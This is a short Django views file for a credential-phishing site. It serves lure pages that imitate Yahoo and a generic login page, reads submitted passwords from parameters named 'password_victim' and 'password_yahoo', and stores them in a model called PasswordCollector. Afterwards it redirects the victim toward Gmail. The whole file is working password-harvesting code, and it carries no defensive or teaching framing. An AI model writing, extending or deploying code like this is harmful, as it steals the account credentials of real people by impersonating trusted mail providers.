from django.shortcuts import render_to_response, redirect
from .models import PasswordCollector
from django.http import HttpResponseRedirect

def main_place(request):
	t = request.GET.get("type","")

	if t == "yahoo":
		return render_to_response('yahoo.html')
	else:
		return render_to_response('index.html')


def process_url(request):
	password = request.GET.get("password_victim","")

	if password:
		PasswordCollector.objects.create(password=password)
		return render_to_response('done.html')
	else:
		return render_to_response('index.html')

def process_url_yahoo(request):
	password = request.GET.get("password_yahoo","")

	if password:
		PasswordCollector.objects.create(password=password)
		return render_to_response('done.html')
	else:
		return render_to_response('yahoo.html')



def redirect(request):
		return HttpResponseRedirect("//https://mail.google.com/mail/u/0/")
